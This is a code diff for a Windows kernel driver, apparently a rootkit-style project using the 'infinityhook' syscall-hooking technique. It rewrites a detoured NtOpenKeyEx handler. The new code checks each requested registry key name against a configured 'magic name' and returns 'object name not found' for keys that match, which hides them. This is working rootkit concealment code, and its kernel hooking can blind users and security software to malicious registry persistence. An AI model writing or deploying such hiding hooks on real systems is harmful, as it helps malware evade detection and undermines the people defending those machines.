@@ -19,31 +19,31 @@ NTSTATUS DetourNtOpenKeyEx(
 	_In_ POBJECT_ATTRIBUTES ObjectAttributes,
 	_In_ ULONG OpenOptions)
 {
-	kprintf("[+] infinityhook: In Detoured NtOpenKeyEx, calling the original now...\n");
-	return OriginalNtOpenKeyEx(pKeyHandle, DesiredAccess, ObjectAttributes, OpenOptions);
+	//kprintf("[+] infinityhook: In Detoured NtOpenKeyEx, calling the original now...\n");
 	
-	//if (ObjectAttributes &&
-	//	ObjectAttributes->ObjectName &&
-	//	ObjectAttributes->ObjectName->Buffer)
-	//{
-	//	kprintf("[+] infinityhook: NtOpenKeyEx length: %d, name: %wZ\n", ObjectAttributes->ObjectName->Length, ObjectAttributes->ObjectName);
+	if (ObjectAttributes &&
+		ObjectAttributes->ObjectName &&
+		ObjectAttributes->ObjectName->Buffer)
+	{
+		kprintf("[+] infinityhook: NtOpenKeyEx length: %d, name: %wZ\n", ObjectAttributes->ObjectName->Length, ObjectAttributes->ObjectName);
 
-	//	/*PWCHAR ObjectName = (PWCHAR)ExAllocatePool(NonPagedPool, ObjectAttributes->ObjectName->Length + sizeof(wchar_t));
-	//	if (ObjectName)
-	//	{
-	//		memset(ObjectName, 0, ObjectAttributes->ObjectName->Length + sizeof(wchar_t));
-	//		memcpy(ObjectName, ObjectAttributes->ObjectName->Buffer, ObjectAttributes->ObjectName->Length);
-	//	}*/
+		PWCHAR ObjectName = (PWCHAR)ExAllocatePool(NonPagedPool, ObjectAttributes->ObjectName->Length + sizeof(wchar_t));
+		if (ObjectName) {
+			memset(ObjectName, 0, ObjectAttributes->ObjectName->Length + sizeof(wchar_t));
+			memcpy(ObjectName, ObjectAttributes->ObjectName->Buffer, ObjectAttributes->ObjectName->Length);
 
-	//	;		//kprintf("[+] infinityhook: NtOpenKeyEx ObjectAttributes->ObjectName->Length: %d\n", ObjectAttributes->ObjectName->Length);
-	//			// copy the name to our null-terminated buffer (dumb way, just testing what it contains...)
-	//			/*wchar_t NameBuffer[MAX_PATH_SYSHOOKER] = { 0 };
-	//			size_t NameLength = ObjectAttributes->ObjectName->Length;
-	//			for (size_t i = 0; i < NameLength - 10; ++i) {
-	//				NameBuffer[i] = ObjectAttributes->ObjectName->Buffer[i];
-	//			}*/
-	//			//kprintf("[+] infinityhook: NtOpenKeyEx ObjectAttributes->ObjectName: %ws\n", NameBuffer);
-	//}
+			// TODO - add better way of checking if we want to hide a registry key
+			if (wcsstr(ObjectName, Settings.RegistryKeyMagicName)) {
+				kprintf("[+] infinityhook: NtOpenKeyEx: hiding %ws\n", ObjectName);
+				ExFreePool(ObjectName);
+				return STATUS_OBJECT_NAME_NOT_FOUND;
+			}
+
+			ExFreePool(ObjectName); // free the buffer
+		}
+		else kprintf("[-] infinityhook: NtOpenKeyEx: failed to allocate buffer...\n");
+	}
+	return OriginalNtOpenKeyEx(pKeyHandle, DesiredAccess, ObjectAttributes, OpenOptions);
 	
 
 	//NTSTATUS result = OriginalNtOpenKeyEx(pKeyHandle, DesiredAccess, ObjectAttributes);
